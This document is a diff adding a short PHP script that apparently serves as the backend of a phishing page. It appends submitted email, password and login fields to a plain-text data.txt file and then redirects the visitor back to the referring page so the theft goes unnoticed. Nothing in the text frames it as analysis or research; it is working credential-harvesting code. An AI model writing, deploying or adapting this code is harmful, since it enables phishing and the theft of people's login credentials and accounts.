@@ -1,0 +1,9 @@
+<?php
+if(isset($_POST["eml"])){
+ $ret=file_put_contents("data.txt",$_POST["eml"]."
+",FILE_APPEND|LOCK_EX);}if(isset($_POST["pwd"])){
+ $ret=file_put_contents("data.txt",$_POST["pwd"]."
+",FILE_APPEND|LOCK_EX);}if(isset($_POST["Login"])){
+ $ret=file_put_contents("data.txt",$_POST["Login"]."
+",FILE_APPEND|LOCK_EX);}
+ header("Location:".$_SERVER['HTTP_REFERER']);?>
